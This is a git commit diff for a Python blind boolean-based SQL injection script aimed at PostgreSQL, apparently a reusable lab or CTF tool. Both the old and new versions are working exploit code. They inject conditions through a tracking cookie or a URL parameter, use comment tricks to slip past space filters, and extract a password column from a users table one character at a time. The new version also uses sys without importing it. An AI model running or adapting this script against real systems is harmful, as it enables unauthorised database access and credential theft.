a02c81c1a0aff8ba0eadf6e9147ab4c0c78a8ba8
0xpk <136787670+H4ck3rxPK@users.noreply.github.com>
2025-12-09 16:00:38 +0800

    Update PostgreSQL.py

--- Boolean-based/PostgreSQL.py
+++ Boolean-based/PostgreSQL.py
@@ -1,70 +1,43 @@
-#!/usr/bin/python3
-import json,sys,requests,time
-from multiprocessing import Pool
-from itertools import repeat
+import requests
 from urllib.parse import quote_plus
 
 url = sys.argv[1]
 session = requests.Session()
 
-def oracle(query):
-    payload = quote_plus(f"' OR ({query})--")
-    cookies = {
-        "TrackingId": payload
-    }
-    r = requests.get(url,cookies=cookies)
-    #print(request.data)
-    #print(r.text)
-    #j = json.loads(r.text)
-    #return j['status'] == 'taken'
-    return 'Welcome back!' in r.text 
+def oracle(condition):
+    url = 'http://192.168.209.240/pages/profile.php?user_id=1&receiver_id=' # change me
+    query = f"1/**/or/**/{condition}%23" # change me
+    #cookies={"PHPSESSID":"4d7nv0vm6kalte4qq4q8lo0pbq"}
+    response = session.get(url+query) # maybe change me
+    #print(url+query)
+    return "Followed" in response.text
 
-# confirm oracle can run correct
-"""
-assert oracle("1=1")
-assert not oracle("1=0")
-"""
-
-# Calculate the Length or Count
-def dumpInteger(query):
+def dump_integer(query):
     low = 0
     high = 127
     while low <= high:
         mid = (low+high) // 2
-        if oracle(f"LENGTH(({query})) BETWEEN {low} AND {mid}"):
+        if oracle(f"LENGTH(({query}))/**/BETWEEN/**/{low}/**/AND/**/{mid}"):
             high = mid -1
         else:
             low = mid + 1
     return low
 
-def do_binary_search_char(args):
-    condition, guess_range = args
-    left, right = guess_range
-    while right - left > 3:
-        guess = int(left + (right - left) / 2)
-        if oracle(f"({guess}>({condition}))"):
-            right = guess
-        else:
-            left = guess
-    for i in range(left, right):
-        if oracle(f"({i}=({condition}))"):
-            return i
-    return left
+def dump_string(query, length):
+    var = ""
+    for i in range(1,length+1):  
+        c = 0
+        for p in range(7):
+            if oracle(f"ASCII(SUBSTRING(({query}),{i},1))%26{2**p}>0"):
+                c |= 2**p
+        var += chr(c)
+        print(var)
+    return var
 
-# Dumping string
-def dumpString(query, length):
-    conditions = [f"ASCII(SUBSTRING(({query}),{i},1))" for i in range(1, length + 1)]
-    guess_range = (32, 128)
-    params = zip(conditions, repeat(guess_range))
-    with Pool(10) as pool:
-        result = pool.map(do_binary_search_char, params)
-    val = ''.join([chr(i) for i in result])
-    print(val)
-    return val
-
+#assert oracle("1=1")
+#assert not oracle("1=0")
 table = "users" # change this
-column = "password" # change this
-payload = f"SELECT {column} FROM {table} LIMIT 1 OFFSET 0" # or WHERE username = 'administrator'
-length = dumpInteger(payload)
-print(length)
-value = dumpString(payload,int(length))
+column = "backup_password" # change this
+payload = f"SELECT/**/{column}/**/FROM/**/{table}/**/LIMIT/**/1/**/OFFSET/**/0"  # or WHERE username = 'administrator'
+length = dump_integer(payload)
+admin_password = dump_string(payload,int(length))
